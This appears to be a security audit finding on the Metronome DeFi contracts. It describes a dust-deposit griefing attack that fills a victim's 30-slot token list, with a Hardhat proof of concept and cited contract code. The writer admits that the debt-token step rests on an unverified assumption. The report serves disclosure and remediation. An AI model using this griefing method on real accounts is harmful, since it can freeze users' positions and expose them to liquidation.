### Title
Dust-transfer spam fills `MAX_TOKENS_PER_USER` slots and permanently blocks a victim from adding new collateral or debt positions - ([File: contracts/Pool.sol](contracts/Pool.sol) / [File: contracts/DepositToken.sol](contracts/DepositToken.sol))

### Summary
The EOS "transaction congestion" report describes an attacker spamming cheap operations to deny service to other users. The Metronome analog is a dust-spam griefing attack: an attacker can spam tiny `DepositToken` transfers (or dust `deposit(..., onBehalfOf_)` calls) to a victim, forcibly filling the victim's per-account token list up to `MAX_TOKENS_PER_USER = 30`. Once the list is full, every code path that would add a *new* deposit or debt token to the victim's account reverts with `UserReachedMaxTokens`, blocking the victim from depositing a new collateral type, receiving new msdTokens, or minting a new synthetic asset.

### Finding Description
`Pool.addToDepositTokensOfAccount` and `Pool.addToDebtTokensOfAccount` are gated by `onlyIfAdditionWillNotReachMaxTokens`, which reverts once `debtTokensOfAccount.length(account_) + depositTokensOfAccount.length(account_) >= 30` [1](#0-0) .

`DepositToken._transfer` pushes the recipient's deposit token onto their list whenever the recipient's prior balance was 0, with no consent required [2](#0-1) . `DepositToken.deposit(amount_, onBehalfOf_)` lets anyone mint shares to an arbitrary `onBehalfOf_`, and `_mint` performs the same unsolicited list insertion [3](#0-2) .

Attack path:
1. Attacker deposits 1 wei of each supported underlying (or deposits once into a token with small decimals and splits dust), then calls `msdToken_i.transfer(victim, 1)` — or directly calls `msdToken_i.deposit(1, victim)` — for enough distinct deposit tokens to push the victim's combined list to 30 entries.
2. From then on, any victim action that would register a new token type reverts: `deposit` into a collateral they don't already hold, `DebtToken.issue` for a synthetic they don't already owe, `transfer`/`transferFrom`/`seize` that would give them a new msdToken, and `SmartFarmingManager.leverage`/`flashRepay` flows that mint a new deposit or debt token.

The victim can clear slots by fully transferring the dust back out (`_transfer` removes the entry when the sender's balance hits 0) [4](#0-3) , but the attacker can re-grief in the same block via `deposit(1, victim)`, and the victim's own rescue transaction (`deposit` of a new collateral to heal an underwater position) can be front-run with a fresh dust insert.

### Impact Explanation
Temporary freezing of funds / forced-liquidation enabling. A victim holding an unhealthy position whose only recovery path is depositing a *new* collateral type (or leveraging via SmartFarmingManager, which mints new deposit/debt tokens) is denied that path entirely while griefed — their position can then be liquidated even though they had funds and willingness to recapitalize. The attack costs the attacker only gas plus a few wei of underlying per slot, matching the economics of the reported congestion spam. Because `addToDebtTokensOfAccount` shares the same 30-slot counter, filling the list also blocks new borrowing and leveraged-farming positions, freezing smart-farming yield accrual for new synths.

### Likelihood Explanation
Fully permissionless: `transfer` and `deposit(amount, onBehalfOf)` are public, require no approvals, and `onBehalfOf_` is unrestricted (only checked against `address(0)` and Treasury) [5](#0-4) . No privileged role, oracle manipulation, or governance parameter is required. Cost scales with ~30 cheap transactions. The attack is repeatable against any account at any time, and re-griefing via `deposit(1, victim)` defeats the victim's cleanup because each dust deposit re-adds an entry.

### Recommendation
- Only register a token in `depositTokensOfAccount`/`debtTokensOfAccount` when the user initiates the action themselves (`deposit` for `msg.sender`, `issue`), not on inbound `transfer`/`seize`/`deposit-on-behalf`; alternatively, make list membership opt-in and have `depositOf`/`debtPositionOf` iterate pool-level tokens or accept an explicit token list.
- As a lighter mitigation, let anyone remove entries for accounts they control and raise the effective cost of griefing by enforcing a minimum first-deposit amount (e.g., dust below `debtFloorInUsd`-equivalent collateral cannot create a new list entry), so spamming 30 slots requires meaningful capital.

### Proof of Concept
Hardhat fork outline:

```ts
// setup: pool with >= 2 deposit tokens msdA ... msdN registered; victim has no balances
const victim = (await ethers.getSigners())[1];
const attacker = (await ethers.getSigners())[2];

// 1) Attacker fills victim's list to MAX_TOKENS_PER_USER via dust deposits
const max = (await pool.MAX_TOKENS_PER_USER()).toNumber();
for (const dToken of depositTokens.slice(0, max)) {
  const underlying = await ethers.getContractAt('IERC20', await dToken.underlying());
  await underlying.connect(attacker).approve(dToken.address, 1);
  await dToken.connect(attacker).deposit(1, victim.address); // unsolicited insert
}
expect(await pool.getDepositTokensOfAccount(victim.address)).to.have.lengthOf(max);

// 2) Victim tries to deposit into a NEW collateral type -> reverts
const newToken = depositTokens[max]; // a deposit token victim does not hold
await expect(newToken.connect(victim).deposit(1e18, victim.address))
  .to.be.revertedWithCustomError(pool, 'UserReachedMaxTokens');

// 3) Victim tries to mint a NEW synthetic -> issue -> _mint -> addToDebtTokensOfAccount reverts
await expect(msXDebtToken.connect(victim).issue(parseEther('1'), victim.address))
  .to.be.revertedWithCustomError(pool, 'UserReachedMaxTokens');

// 4) Victim clears one slot by transferring dust out, but attacker re-griefs atomically
await depositTokens[0].connect(victim).transfer(attacker.address, 1);
await depositTokens[0].connect(attacker).deposit(1, victim.address); // front-run re-fill
await expect(newToken.connect(victim).deposit(1e18, victim.address))
  .to.be.revertedWithCustomError(pool, 'UserReachedMaxTokens');
```

Caveat: I verified the revert path through `DepositToken._mint`/`_transfer` → `Pool.addToDepositTokensOfAccount` and the shared 30-slot counter covering `addToDebtTokensOfAccount` [6](#0-5) . I could not re-inspect `DebtToken.sol` in this session (the index truncated it), so step 3 assumes — consistent with the `addToDebtTokensOfAccount` doc-comment — that `DebtToken` calls it when a balance goes from 0 to non-zero during `issue`. The deposit-token-only variant (step 2) stands on its own.

### Citations

**File:** contracts/Pool.sol (L143-148)
```text
    modifier onlyIfAdditionWillNotReachMaxTokens(address account_) {
        if (debtTokensOfAccount.length(account_) + depositTokensOfAccount.length(account_) >= MAX_TOKENS_PER_USER) {
            revert UserReachedMaxTokens();
        }
        _;
    }
```

**File:** contracts/Pool.sol (L204-220)
```text
    function addToDebtTokensOfAccount(address account_) external onlyIfAdditionWillNotReachMaxTokens(account_) {
        address _debtToken = _msgSender();
        _revertIfSenderIsNotDebtToken(_debtToken);
        if (!debtTokensOfAccount.add(account_, _debtToken)) revert DebtTokenAlreadyExists();
    }

    /**
     * @notice Add a deposit token to the per-account list
     * @dev This function is called from `DepositToken` when user's balance changes from `0`
     * @dev The caller should ensure to not pass `address(0)` as `_account`
     * @param account_ The account address
     */
    function addToDepositTokensOfAccount(address account_) external onlyIfAdditionWillNotReachMaxTokens(account_) {
        address _depositToken = _msgSender();
        _revertIfSenderIsNotDepositToken(_depositToken);
        if (!depositTokensOfAccount.add(account_, _depositToken)) revert DepositTokenAlreadyExists();
    }
```

**File:** contracts/DepositToken.sol (L211-237)
```text
    function deposit(
        uint256 amount_,
        address onBehalfOf_
    ) external override whenNotPaused nonReentrant onlyIfDepositTokenExists returns (uint256 _deposited, uint256 _fee) {
        if (amount_ == 0) revert AmountIsZero();
        if (onBehalfOf_ == address(0)) revert BeneficiaryIsNull();

        IPool _pool = pool;
        IERC20 _underlying = underlying;
        address _msgSender = _msgSender();
        address _treasury = address(_pool.treasury());

        if (_msgSender == _treasury) revert TreasuryCanNotDeposit();

        uint256 _balanceBefore = _underlying.balanceOf(_treasury);
        _underlying.safeTransferFrom(_msgSender, _treasury, amount_);
        amount_ = _underlying.balanceOf(_treasury) - _balanceBefore;

        (_deposited, _fee) = quoteDepositOut(amount_);
        if (_fee > 0) {
            _mint(_pool.feeCollector(), _fee);
        }

        _mint(onBehalfOf_, _deposited);

        emit CollateralDeposited(_msgSender, onBehalfOf_, amount_, _deposited, _fee);
    }
```

**File:** contracts/DepositToken.sol (L485-488)
```text
        // Add this token to the deposit tokens list if the recipient is receiving it for the 1st time
        if (_balanceBefore == 0 && amount_ > 0) {
            pool.addToDepositTokensOfAccount(account_);
        }
```

**File:** contracts/DepositToken.sol (L517-520)
```text
        // Add this token to the deposit tokens list if the recipient is receiving it for the 1st time
        if (_recipientBalanceBefore == 0 && amount_ > 0) {
            pool.addToDepositTokensOfAccount(recipient_);
        }
```

**File:** contracts/DepositToken.sol (L522-525)
```text
        // Remove this token from the deposit tokens list if the sender's balance goes to zero
        if (amount_ > 0 && balanceOf[sender_] == 0) {
            pool.removeFromDepositTokensOfAccount(sender_);
        }
```
